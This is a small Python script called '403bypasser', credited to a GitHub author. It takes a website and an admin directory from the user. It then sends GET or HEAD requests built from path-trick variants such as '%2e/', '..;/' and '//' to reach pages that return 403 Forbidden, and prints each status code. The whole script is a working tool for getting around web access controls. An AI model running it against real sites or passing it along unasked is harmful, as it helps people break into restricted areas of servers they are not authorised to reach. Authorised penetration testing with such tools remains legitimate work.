import requests

print("Author: github.com/Mr-BYK")
print("------------------------------------- 403bypasser -------------------------------------")
print("My is to bypass 403 status code and to reach restricted pages.\n"
      "HTTP status codes are detected by both GET and HEAD requests.\n")

website = input('Usage : https://www.example.com : ')
print("Leave blank if there is no admin directory.")
directory = input('Usage : admin :')
url = [directory,'%2e/'+directory,directory+'/.',directory+'//','./'+directory+'/./',directory+'/',directory+'..;/']

# GET
def get_Requests():
    for i in url:
        r=requests.get(website+"/"+i+"/")
        print("[*] GET:",i," ---------------> ",r.status_code)

# HEAD
def head_Requests():
    for i in url:
        r = requests.head(website + "/" + i + "/",data={'key':'value'})
        print("[*] HEAD:",i, " ---------------> ",r.status_code)

while True:
    print("GET = 0 , HEAD = 1" )
    selection = input("Selection: ")
    if selection == "0":
        get_Requests()
    elif selection == "1":
        head_Requests()
    else:
        print("Selection Failed!")




